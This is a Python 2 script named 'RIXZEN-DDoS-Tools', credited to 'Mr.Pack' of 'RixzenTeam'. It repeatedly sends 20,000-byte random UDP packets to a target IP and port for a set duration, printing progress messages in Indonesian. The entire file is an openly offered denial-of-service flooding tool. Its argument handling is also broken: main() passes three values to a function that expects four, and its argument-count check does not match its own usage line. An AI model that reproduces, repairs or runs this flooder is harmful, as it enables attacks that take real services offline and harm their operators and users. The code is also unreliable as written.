import time
import socket
import random
import sys
def usage():
    print "\033[1;32m######################################################################################"
    print "\033[1;32m#                             RIXZEN-DDoS-Tools                                     \033[1;32m##"
    print "\033[1;32m#[1;91mCommands : python2 RixzenDDoSTools.py <ip> <port> <packet> <duration>              \033[1;32m##"
    print "\033[1;32m#[1;91mCreator  : Mr.Pack               \033[1;32m##      #      #                                  \033[1;32m##"
    print "\033[1;32m#[1;91mTeam     : RixzenTeam            \033[1;32m##      #      #                                  \033[1;32m##"
    print "\033[1;32m#[1;91mVersion  : 1.0                   \033[1;32m##      #      #                                  \033[1;32m##"
    print "\033[1;32m#[1;91mTQAdmin  : Mr.Pack, Mr.Mek, Mr.Tod                                                 \033[1;32m##"
    print "\033[1;32m######################################################################################"
def flood(victim, vport, packet, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = packet
    while 1:
        if time.time() > timeout:
            break
        else:
            pass
            client.sendto(bytes, (victim, vport))
            sent = sent + 1
            print "\033[1;91mMemulai \033[1;32m%s \033[1;91mmengirim paket ke ip: \033[1;32m%s \033[1;91mpada port \033[1;32m%s "%(sent, victim, vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
if __name__ == '__main__':
    main()